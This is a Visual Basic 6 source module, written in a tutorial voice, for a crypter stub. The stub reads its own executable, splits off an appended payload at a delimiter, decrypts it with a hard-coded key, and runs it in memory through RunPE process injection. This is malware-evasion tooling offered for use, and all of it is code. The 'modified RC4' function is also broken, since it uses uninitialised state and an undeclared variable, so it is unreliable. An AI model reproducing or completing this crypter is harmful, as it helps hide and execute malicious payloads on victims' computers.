Attribute VB_Name = "Module1"
Sub Main()

'Here Begin All

'Now Declare a Variable Called .... MEX

Dim MEX As String ' This variable will Store The Stub EXE Path

MEX = App.Path & "\" & App.EXEName & ".exe" ' This is EXE Path look

'Ok Now we must Open As in binary mode and Get all The data That the client introduced on as..

Dim Data As String

Open MEX For Binary As #1
Data = Space(LOF(1)) ' Store all the data
Get #1, , Data ' Get All That Data
Close #1 ' Close The file

'We must Split That Data for separate Stub Path and Crypted File
'For That create a Array variable and Separate that

Dim Delimiter() As String '() are very important because that indicate that Delimiter variable is a Array

'Now Split The Data

Delimiter() = Split(Data, "[DELIMITER]") 'ok The Stub and Crypted File is Delimited

'Delimiter(0) = Stub Data
'Delimiter(1) = Crypted Data

'ok Now We must Decrypt Crypted file for can Execute The File Decypted on Memory with RunPE
'Add RC4 Function

Delimiter(1) = RC4(Delimiter(1), "SKYWEB") ' Decypt The Data

'Now.. Let's Execute on memory
'We must add RunPE Module

Call Injec(MEX, StrConv(Delimiter(1), vbFromUnicode), vbNullString)

'ok now all is complete... Lets Compile
'Ok Stub Compiled and No Errors :)

'Lets COmpile Client File

End Sub


Public Function RC4(ByVal Data As String, ByVal Password As String) As String ' This is a Modified RC4 Function ^^
On Error Resume Next
Dim F(0 To 255) As Integer, X, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For X = 0 To 255
    Y = (Y + F(X) + Key(X Mod Len(Password))) Mod 256
    F(X) = X
Next X
Key() = StrConv(Data, vbFromUnicode)
For X = 0 To Len(Data)
    Y = (Y + F(Y) + 1) Mod 256
    Key(X) = Key(X) Xor F(Temp + F((Y + F(Y)) Mod 254))
Next X
RC4 = StrConv(Key, vbUnicode)
End Function
